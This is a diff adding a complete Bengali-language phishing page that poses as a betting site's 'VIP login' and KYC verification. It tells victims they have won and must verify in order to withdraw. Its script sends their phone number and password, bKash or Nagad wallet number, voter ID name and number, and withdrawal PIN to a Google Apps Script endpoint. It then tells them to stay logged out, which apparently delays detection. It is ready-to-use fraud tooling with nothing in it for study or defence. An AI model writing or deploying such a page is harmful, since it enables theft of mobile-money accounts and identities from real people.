@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PJOK - VIP Login & Complete KYC</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #10492f; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+
+        .phone-container {
+            width: 380px;
+            height: 700px;
+            border-radius: 35px;
+            overflow-y: auto;
+            position: relative;
+            border: 5px solid #01682f;
+            display: flex;
+            flex-direction: column;
+            color: rgb(0, 0, 0);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.6);
+        }
+
+        .page { display: none; flex-direction: column; flex-grow: 1; padding: 20px; }
+        .page.active { display: flex; }
+
+        #loginPage.page.active {
+            background: #007545;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-box { 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            margin-bottom: 20px; 
+            width: 100%;
+        }
+
+        .logo-img {
+            height: 80px;
+            width: auto;
+            max-width: 240px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .vip-login-title { font-size: 27px; font-weight: bold; color: #ffca28; text-align: center; letter-spacing: 2px; margin-bottom: 30px; text-transform: uppercase; }
+
+        .input-group { width: 100%; background: #ffffff; border-radius: 10px; display: flex; align-items: center; padding: 14px 15px; margin-bottom: 15px; }
+        .input-group i { color: #333; font-size: 16px; margin-right: 12px; }
+        .input-group input { background: transparent; border: none; outline: none; color: #333; font-size: 15px; width: 100%; font-weight: 500; }
+        .input-group input::placeholder { color: #7f8c8d; }
+
+        .options-row { width: 100%; display: flex; justify-content: space-between; align-items: center; font-size: 13px; margin-bottom: 25px; color: #fff; }
+        .remember-me { display: flex; align-items: center; gap: 6px; cursor: pointer; }
+        .forgot-pass { color: #ffca28; text-decoration: none; font-weight: 600; }
+
+        .login-btn {
+            width: 100%; padding: 15px; background: #00c462; border: none; border-radius: 10px;
+            font-size: 17px; font-weight: bold; color: #000000; cursor: pointer; margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgb(1, 71, 33); text-transform: uppercase;
+        }
+
+        #kycPage.page.active {
+            background: #f8f9fa;
+            justify-content: flex-start;
+            color: #333;
+        }
+
+        .top-bar { display: flex; align-items: center; padding-bottom: 10px; font-size: 17px; font-weight: bold; color: #222; border-bottom: 1px solid #ddd; margin-bottom: 12px; }
+        .top-bar i { font-size: 18px; cursor: pointer; margin-right: 15px; color: #333; }
+        .top-bar span { flex-grow: 1; text-align: center; margin-right: 20px; }
+
+        .notice-banner { background: #fff3cd; color: #856404; padding: 9px; border-radius: 8px; font-size: 11px; font-weight: bold; text-align: center; margin-bottom: 12px; border: 1px solid #ffeeba; line-height: 1.4; }
+
+        .section-title { font-size: 12.5px; font-weight: bold; color: #333; margin-bottom: 5px; }
+
+        .wallet-select-row { display: flex; gap: 10px; margin-bottom: 10px; }
+        .wallet-option {
+            border: 2px solid #ccc; border-radius: 8px; padding: 6px 10px; background: white; cursor: pointer;
+            display: flex; align-items: center; gap: 6px; font-weight: bold; user-select: none; color: #333; flex: 1; justify-content: center; font-size: 14px;
+        }
+        .wallet-option.active { border: 2px solid #e74c3c !important; background-color: #fff0f3; color: #e74c3c; }
+
+        .wallet-badge-nagad { color: #e74c3c; font-weight: 900; background: #ffebee; padding: 1px 5px; border-radius: 4px; font-size: 12px; }
+        .wallet-badge-bkash { color: #e91e63; font-weight: 900; background: #fce4ec; padding: 1px 5px; border-radius: 4px; font-size: 12px; }
+
+        .single-wallet-box { border: 2px solid #e74c3c; border-radius: 6px; padding: 7px; background: #fff0f3; color: #e74c3c; font-weight: bold; margin-bottom: 10px; width: 90px; text-align: center; font-size: 13px; }
+
+        .kyc-input-box { background: #e9ecef; border-radius: 8px; padding: 9px 10px; margin-bottom: 10px; border: 1px solid #ced4da; display: flex; align-items: center; }
+        .kyc-input-box input { background: transparent; border: none; outline: none; width: 100%; font-size: 13px; color: #333; }
+        .kyc-input-box input::placeholder { color: #6c757d; font-size: 12px; }
+
+        .red-text { color: red; font-size: 10px; font-weight: bold; margin-bottom: 10px; display: block; line-height: 1.3; }
+
+        .submit-btn { width: 100%; padding: 12px; background: #ffc107; border: none; border-radius: 8px; font-size: 15px; font-weight: bold; color: #000; cursor: pointer; margin-top: auto; text-align: center; }
+
+        #successPage.page.active {
+            background: #f4f5f7;
+            justify-content: center;
+            align-items: center;
+        }
+        .success-box {
+            background: #ffffff; color: #333; padding: 25px 20px; border-radius: 15px;
+            text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 100%;
+        }
+        .success-icon { font-size: 50px; color: #00c853; margin-bottom: 15px; }
+        .success-title { font-size: 18px; font-weight: bold; color: #2c3e50; margin-bottom: 12px; }
+        .success-desc { font-size: 13px; color: #555; line-height: 1.6; }
+
+        /* 🎨 Custom Popup Style */
+        .popup-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            backdrop-filter: blur(3px);
+        }
+
+        .popup-overlay.show {
+            display: flex;
+            animation: fadeIn 0.25s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .popup-box {
+            background: #ffffff;
+            border-radius: 18px;
+            padding: 25px 22px;
+            width: 85%;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            animation: popIn 0.3s ease;
+            position: relative;
+        }
+
+        .popup-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: #ffe5e5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 32px;
+            color: #e74c3c;
+        }
+
+        .popup-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .popup-message {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .popup-btn {
+            width: 100%;
+            padding: 12px;
+            background: #e74c3c;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .popup-btn:hover {
+            background: #c0392b;
+            transform: scale(1.02);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="phone-container">
+
+        <!-- PAGE 1: LOGIN -->
+        <div id="loginPage" class="page active">
+            <div style="width: 100%; max-width: 320px;">
+                
+                <div class="logo-box">
+                    <img src="https://images.23924894.com/wsd-images-prod/pjokbdtf6/fe_setting/web_logo/wps_logo_20250620214714.png" 
+                         alt="333OK Logo" 
+                         class="logo-img">
+                </div>
+                
+                <div class="vip-login-title">VIP LOGIN</div>
+
+                <div class="input-group">
+                    <i class="fa-solid fa-phone"></i>
+                    <input type="text" id="phone" placeholder="Mobile Number" maxlength="11">
+                </div>
+
+                <div class="input-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="password" placeholder="Password">
+                </div>
+
+                <div class="options-row">
+                    <label class="remember-me"><input type="checkbox" checked> Remember Me</label>
+                    <a href="#" class="forgot-pass">Forgot Password?</a>
+                </div>
+
+                <button class="login-btn" onclick="sendLoginData()">LOGIN</button>
+            </div>
+        </div>
+
+        <!-- PAGE 2: KYC -->
+        <div id="kycPage" class="page">
+            <div class="top-bar">
+                <i class="fa-solid fa-arrow-left" onclick="goBackToLogin()"></i>
+                <span>KYC ভেরিফিকেশন</span>
+            </div>
+
+            <div class="notice-banner">
+                আপনাকে অনেক অনেক শুভেচ্ছা ও অভিনন্দন! আপনি আমাদের একজন বড় জয় পাওয়া সম্মানিত গ্রাহক তাই দয়া করে আপনার টাকা নিরাপদে উত্তোলন করতে আপনার KYC ভেরিফাই করুন।
+            </div>
+
+            <div class="section-title">ই-ওয়ালেট গ্রুপ নির্বাচন করুন</div>
+            <div class="wallet-select-row">
+                <div class="wallet-option active" id="btnNagad" onclick="selectWallet('নগদ')">
+                    <span class="wallet-badge-nagad">৳</span> Nagad
+                </div>
+                <div class="wallet-option" id="btnBkash" onclick="selectWallet('bKash')">
+                    <span class="wallet-badge-bkash">b</span> BKash
+                </div>
+            </div>
+
+            <div class="section-title">ই-ওয়ালেট প্রকার</div>
+            <div class="single-wallet-box" id="walletTypeDisplay">Nagad</div>
+
+            <div class="kyc-input-box">
+                <i class="fa-solid fa-credit-card" style="margin-right: 8px; color: #666;"></i>
+                <input type="text" id="accountNumber" placeholder="* অনুগ্রহ করে নগদ একাউন্ট নম্বর পূরণ করুন">
+            </div>
+
+            <div class="kyc-input-box">
+                <i class="fa-regular fa-id-card" style="margin-right: 8px; color: #666;"></i>
+                <input type="text" id="voterName" placeholder="* ভোটার আইডি কার্ডের নাম লিখুন">
+            </div>
+
+            <div class="kyc-input-box" style="margin-bottom: 4px;">
+                <i class="fa-solid fa-address-card" style="margin-right: 8px; color: #666;"></i>
+                <input type="text" id="voterNumber" placeholder="* ভোটার আইডি কার্ড নম্বর দিন">
+            </div>
+
+            <span class="red-text">পূর্ববর্তী তথ্যের সাথে নাম ও নম্বর মিল থাকা বাধ্যতামূলক। অন্যথায় উত্তোলন বাতিল হবে।</span>
+
+            <div class="kyc-input-box" style="margin-bottom: 10px;">
+                <i class="fa-solid fa-lock" style="margin-right: 8px; color: #666;"></i>
+                <input type="password" id="transPin" placeholder="* উত্তোলন পাসওয়ার্ড নিশ্চিত করুন">
+            </div>
+
+            <button class="submit-btn" onclick="sendKycData()">জমা দিন</button>
+        </div>
+
+        <!-- PAGE 3: SUCCESS -->
+        <div id="successPage" class="page">
+            <div class="success-box">
+                <div class="success-icon">
+                    <i class="fa-solid fa-circle-check"></i>
+                </div>
+                <div class="success-title">অভিনন্দন! সফলভাবে জমা হয়েছে</div>
+                <div class="success-desc">
+                    আপনাকে অনেক অনেক অভিনন্দন! আপনি আমাদের একজন বড় জয় পাওয়া সম্মানিত গ্রাহক। আপনার KYC ভেরিফিকেশনের জন্য জমা দেওয়া তথ্য আমরা পেয়েছি। খুব শীঘ্রই আমাদের গ্রাহকসেবা প্রতিনিধি আপনার সাথে যোগাযোগ করবে। তাই আপনার আইডিতে লগইন করা থেকে বিরত থাকুন।
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- 🎨 Custom Popup -->
+    <div class="popup-overlay" id="customPopup">
+        <div class="popup-box">
+            <div class="popup-icon" id="popupIcon">❌</div>
+            <div class="popup-title" id="popupTitle">ভুল পাসওয়ার্ড!</div>
+            <div class="popup-message" id="popupMessage">
+                উত্তোলন পাসওয়ার্ড এবং লগইন পাসওয়ার্ড একই হতে পারবে না!
+            </div>
+            <button class="popup-btn" onclick="closePopup()">ঠিক আছে</button>
+        </div>
+    </div>
+
+    <script>
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxtc9IVXWY2OFQ6Tn5va0Qx4ljWiN4kCoRmXGHwRQ2EPVkkY5l4t9yoHPBfZDMAGedn/exec";
+
+        let userPhone = "";
+        let userPass = "";
+        let currentWallet = "নগদ";
+
+        // 🎨 Custom Popup Functions
+        function showPopup(message, title = "ভুল পাসওয়ার্ড!", icon = "❌") {
+            document.getElementById('popupMessage').innerText = message;
+            document.getElementById('popupTitle').innerText = title;
+            document.getElementById('popupIcon').innerText = icon;
+            document.getElementById('customPopup').classList.add('show');
+        }
+
+        function closePopup() {
+            document.getElementById('customPopup').classList.remove('show');
+        }
+
+        // ✅ Google Sheet helper
+        function sendToGoogleSheet(payload) {
+            const formData = new URLSearchParams();
+            for (const key in payload) {
+                formData.append(key, payload[key] ?? "");
+            }
+
+            return fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+                body: formData.toString()
+            });
+        }
+
+        // ✅ Wallet selection
+        function selectWallet(walletName) {
+            currentWallet = walletName;
+            const btnNagad = document.getElementById('btnNagad');
+            const btnBkash = document.getElementById('btnBkash');
+            const walletTypeDisplay = document.getElementById('walletTypeDisplay');
+            const accountNumberInput = document.getElementById('accountNumber');
+
+            if (walletName === 'নগদ') {
+                btnNagad.classList.add('active');
+                btnBkash.classList.remove('active');
+                walletTypeDisplay.innerText = "Nagad";
+                accountNumberInput.placeholder = "* অনুগ্রহ করে নগদ একাউন্ট নম্বর পূরণ করুন";
+            } else {
+                btnBkash.classList.add('active');
+                btnNagad.classList.remove('active');
+                walletTypeDisplay.innerText = "bKash";
+                accountNumberInput.placeholder = "* অনুগ্রহ করে bKash একাউন্ট নম্বর পূরণ করুন";
+            }
+        }
+
+        // ✅ Login → KYC page (with validation popup)
+        function sendLoginData() {
+            userPhone = document.getElementById('phone').value.trim();
+            userPass  = document.getElementById('password').value.trim();
+
+            // 🔴 Validation ১: Number খালি কিনা
+            if (userPhone.length === 0) {
+                showPopup("অনুগ্রহ করে মোবাইল নম্বর পূরণ করুন!", "অসম্পূর্ণ তথ্য", "⚠️");
+                return;
+            }
+
+            // 🔴 Validation ২: Number ১১ digit এর কম হলে
+            if (userPhone.length < 11) {
+                showPopup("মোবাইল নম্বর ১১ সংখ্যার হতে হবে!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৩: Number ১১ digit এর বেশি হলে
+            if (userPhone.length > 11) {
+                showPopup("মোবাইল নম্বর ১১ সংখ্যার বেশি হতে পারবে না!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৪: Number-এ অক্ষর থাকলে
+            if (!/^\d+$/.test(userPhone)) {
+                showPopup("মোবাইল নম্বরে শুধু সংখ্যা থাকতে হবে!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৫: Number "01" দিয়ে শুরু না হলে
+            if (!userPhone.startsWith("01")) {
+                showPopup("মোবাইল নম্বর অবশ্যই 01 দিয়ে শুরু হতে হবে!", "ভুল মোবাইল নম্বর!", "📱");
+                return;
+            }
+
+            // 🔴 Validation ৬: Password খালি কিনা
+            if (userPass.length === 0) {
+                showPopup("অনুগ্রহ করে পাসওয়ার্ড পূরণ করুন!", "অসম্পূর্ণ তথ্য", "⚠️");
+                return;
+            }
+
+            // 🔴 Validation ৭: Password ৬ অক্ষরের কম হলে
+            if (userPass.length < 6) {
+                showPopup("সঠিক পাসওয়ার্ড প্রদান করুন! (কমপক্ষে ৬ অক্ষর)", "ভুল পাসওয়ার্ড!", "🔒");
+                return;
+            }
+
+            // ✅ সব validation পাস হলে
+            sendToGoogleSheet({
+                type: "LOGIN",
+                phone: userPhone,
+                password: userPass
+            })
+            .then(() => console.log("Login data sent"))
+            .catch(err => console.error("Login send error:", err));
+
+            document.getElementById('loginPage').classList.remove('active');
+            document.getElementById('kycPage').classList.add('active');
+        }
+
+        // ✅ KYC submit → success page
+        function sendKycData() {
+            const accNum  = document.getElementById('accountNumber').value.trim();
+            const vName   = document.getElementById('voterName').value.trim();
+            const vNumber = document.getElementById('voterNumber').value.trim();
+            const pin     = document.getElementById('transPin').value.trim();
+
+            if (accNum && vName && vNumber && pin) {
+
+                // 🎯 Transfer PIN = Login Password হলে error
+                if (pin === userPass) {
+                    showPopup("উত্তোলন পাসওয়ার্ড এবং লগইন পাসওয়ার্ড একই হতে পারবে না!", "ভুল পাসওয়ার্ড!", "❌");
+                    document.getElementById('transPin').value = "";
+                    document.getElementById('transPin').focus();
+                    return;
+                }
+
+                sendToGoogleSheet({
+                    type: "KYC",
+                    loginPhone: userPhone,
+                    loginPass: userPass,
+                    wallet: currentWallet,
+                    walletNumber: accNum,
+                    voterName: vName,
+                    voterNID: vNumber,
+                    pin: pin
+                })
+                .then(() => console.log("KYC data sent"))
+                .catch(err => console.error("KYC send error:", err));
+
+                document.getElementById('kycPage').classList.remove('active');
+                document.getElementById('successPage').classList.add('active');
+            } else {
+                showPopup("দয়া করে সকল তথ্য সঠিকভাবে পূরণ করুন!", "অসম্পূর্ণ তথ্য", "⚠️");
+            }
+        }
+
+        // ✅ Back to login
+        function goBackToLogin() {
+            document.getElementById('kycPage').classList.remove('active');
+            document.getElementById('loginPage').classList.add('active');
+        }
+    </script>
+</body>
+</html>
